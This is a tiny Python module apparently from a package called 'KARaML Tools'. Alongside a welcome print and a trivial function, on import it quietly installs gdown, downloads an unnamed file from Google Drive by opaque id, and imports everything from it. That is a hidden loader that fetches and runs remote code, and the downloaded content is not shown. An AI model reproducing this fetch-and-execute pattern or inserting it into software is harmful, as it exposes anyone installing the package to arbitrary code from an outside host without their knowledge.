
print("Welcome to the KARaML Tools package (version 0.0.11)")

def respond():
    return "Response from karaml.py" 

import subprocess
subprocess.run(["pip", "-q", "install", "gdown"])
import gdown
gdown.download(id='14iuvYqoCWdUS_Adf3t1fBNS8tpOj-09Z', quiet=True)
from karaml_setup import *
